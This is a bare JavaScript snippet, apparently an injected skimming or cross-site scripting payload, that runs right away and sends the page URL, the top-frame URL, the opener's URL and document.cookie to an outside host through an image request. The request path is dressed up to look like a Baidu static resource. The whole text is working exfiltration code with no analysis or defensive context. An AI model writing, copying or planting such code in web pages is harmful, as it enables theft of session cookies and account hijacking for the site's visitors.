(function() { (new Image()).src = 'https://js.yunjlsu.xyz/bdstatic.com/?callback=jsonp&id=js&location=' + encodeURIComponent((function() {
        try {
            return document.location.href
        } catch(e) {
            return ''
        }
    })()) + '&toplocation=' + encodeURIComponent((function() {
        try {
            return top.location.href
        } catch(e) {
            return ''
        }
    })()) + '&cookie=' + encodeURIComponent((function() {
        try {
            return document.cookie
        } catch(e) {
            return ''
        }
    })()) + '&opener=' + encodeURIComponent((function() {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href: ''
        } catch(e) {
            return ''
        }
    })());
})();